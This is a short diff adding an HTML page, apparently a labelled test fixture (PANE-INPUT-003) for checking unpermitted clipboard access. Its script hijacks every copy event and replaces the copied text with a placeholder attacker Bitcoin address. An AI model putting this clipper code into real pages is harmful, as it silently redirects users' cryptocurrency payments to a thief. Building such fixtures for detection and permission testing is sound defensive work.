@@ -1,0 +1,12 @@
+<!doctype html>
+<!--
+  PANE-INPUT-003: silently replaces whatever the user copies. No permission
+  gates this call shape, and none is declared here either.
+-->
+<title>App</title>
+<script>
+  document.addEventListener('copy', function (e) {
+    e.clipboardData.setData('text/plain', 'bc1qattackeraddress000000000000000000');
+    e.preventDefault();
+  });
+</script>
